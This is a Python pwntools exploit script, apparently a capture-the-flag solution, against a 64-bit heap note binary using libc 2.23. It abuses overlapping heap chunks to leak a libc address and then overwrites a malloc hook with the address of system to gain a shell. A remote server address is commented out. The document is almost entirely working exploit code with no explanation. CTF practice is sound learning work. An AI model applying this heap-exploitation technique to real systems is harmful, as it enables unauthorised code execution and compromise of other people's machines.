from pwn import *
io=process("./mimic_note_64",env={"LD_PRELOAD":"./libc-2.23.so"})
#io=remote("45.32.120.212",6666)
def add(size):
    io.sendlineafter(">> ","1")
    io.sendlineafter("size?",str(size))


def delete(index):
    io.sendlineafter(">> ","2")
    io.sendlineafter("index ?",str(index))

def show(index):
    io.sendlineafter(">> ","3")
    io.sendlineafter("index ?",str(index))

def edit(index,content):
    io.sendlineafter(">> ","4")
    io.sendlineafter("index ?",str(index))
    io.sendlineafter("content?",content)

add(0xf8)
edit(0,"a"*0xf8)
add(0x68)
edit(1,"b"*0x68)
add(0xf8)
edit(2,"c"*0x68)
add(0x10)
edit(3,"d"*0x10)
delete(0)
edit(1,"b"*0x68)
edit(1,"b"*96+p64(0x170))
delete(2)
add(0xf8)
show(1)
io.recvline()
leak=u64(io.recv(6)+"\x00\x00")
print hex(leak)
add(0x160)
edit(0,"1"*20)
edit(1,"2"*20)
edit(2,"3"*30)
edit(3,"4"*20)
add(0xf8)
edit(4,"a"*0xf8)
add(0x68)
edit(5,"b"*0x68)
add(0xf8)
edit(6,"c"*0x68)
add(0x10)
edit(7,"d"*0x10)
delete(4)
edit(5,"b"*0x68)
edit(5,"b"*96+p64(0x170))
delete(6)
delete(5)
add(280)
hook=leak-0x8b
edit(4,"h"*(30*8)+p64(0)+p64(0x70)+p64(hook))
base=leak-0x3c4b78
#one=base+0x45216
sys=base+0x45390
add(0x65)
add(0x68)
pay="a"*19+p64(sys)
edit(6,pay)
shh=base+0x18cd57
print shh
gdb.attach(io)
add(50)
io.interactive()
